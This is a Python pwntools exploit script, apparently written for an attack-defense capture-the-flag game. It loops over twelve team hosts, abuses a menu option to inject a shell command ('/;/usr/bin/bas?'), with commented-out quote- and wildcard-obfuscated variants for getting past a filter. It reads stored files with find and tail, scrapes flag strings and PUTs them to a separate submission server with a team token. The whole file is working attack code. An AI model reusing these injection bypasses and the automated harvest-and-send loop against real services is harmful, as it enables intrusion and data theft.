#!/usr/bin/env python3
from pwn import *
from hashlib import sha1
import time
import sys
import requests

# =========================================================
#                          SETUP                         
# =========================================================
exe = './source'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '', 50001

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit(ip=None):
    global io
    io = remote(host, port, timeout=3)

    r = sha1(str(time.time()).encode()).digest().hex()
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b':', r[:4].encode())
    io.sendlineafter(b':', r[:4].encode())
    io.sendlineafter(b':', r[:4].encode())

    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b':', r[:4].encode())
    io.sendlineafter(b':', r[:4].encode())

    io.sendlineafter(b':', b'4')
    # io.sendlineafter(b':', b"/;'s''h'")
    # io.sendlineafter(b':', b"/;'b''a''s''h'")
    # io.sendlineafter(b':', b'/;"b""a""s""h"')
    io.sendlineafter(b':', b'/;/usr/bin/bas?')

    # io.sendline(b"grep -r Description stora??/")
    # io.sendline(b"fgrep -r Description stora??/")
    # io.sendline(b"for file in $(ls st?????/); do tail -n 1 st?????/$file; done")
    # io.sendline(b"find st????e -type f | xargs tail -n 2")
    io.sendline(b"find sto???e -type f -exec tail -n 2 {} +")


    io.sendline(f'echo {r}'.encode())

    flags = []
    try:
        tmp = io.recvuntil(r.encode())
        flags = re.findall(r'[A-Z0-9]{31}=', tmp.decode())
        print("FLAGS:", flags)
    except Exception as e:
        print(e)
    io.close()

    for i in range(0, len(flags), 100):
        response = requests.put(
                'http://10.10.10.10/flags/',
                json=flags[i:i+100],
                headers={
                    'X-Team-Token': 'd480aedb8924c64f',
                })
        print(response.text)
    io.close()
    
if __name__ == '__main__':
    while(True):
        for ip in range(1, 12+1):
            host = f'10.80.{ip}.2'
            try:
                exploit(host)
            except Exception as e:
                print(e)
        log.info("SLEEPING FOR 5s")
        sleep(5)
